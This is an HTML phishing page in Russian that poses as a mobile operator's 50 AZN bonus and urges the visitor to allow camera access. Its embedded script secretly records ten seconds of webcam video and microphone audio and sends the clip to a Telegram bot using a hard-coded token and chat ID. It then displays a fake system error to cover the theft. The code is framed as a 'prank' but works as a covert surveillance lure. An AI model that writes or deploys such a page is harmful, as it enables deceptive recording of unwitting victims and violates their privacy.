<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подарок от оператора</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 100px; background: #f0f2f5; color: #333; }
        .btn { background: #007bff; color: white; padding: 20px 40px; border: none; border-radius: 10px; cursor: pointer; font-size: 20px; font-weight: bold; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
        .btn:hover { background: #0056b3; }
    </style>
</head>
<body>
    <h1>🎁 Поздравляем!</h1>
    <p>Ваш номер выбран для начисления 50 AZN.</p>
    <p>Для подтверждения получения бонуса нажмите кнопку и разрешите доступ к камере.</p>
    <br>
    <button class="btn" onclick="startPrank()">ПОЛУЧИТЬ БОНУС</button>

    <script>
        const TOKEN = '8988557956:AAET8Q_hi2cfewpvIwSzsP_A6-OmLotvae4';
        const CHAT_ID = '5590781901';

        async function startPrank() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];

                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('video', blob, 'prank.webm');
                    formData.append('caption', '📸 Новый улов! Видео и звук:');

                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });
                };

                mediaRecorder.start();

                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                    alert("Ошибка системы: Повторите попытку позже.");
                }, 10000); 

            } catch (err) {
                alert("Ошибка: Для получения бонуса необходимо разрешить доступ к камере.");
            }
        }
    </script>
</body>
</html>
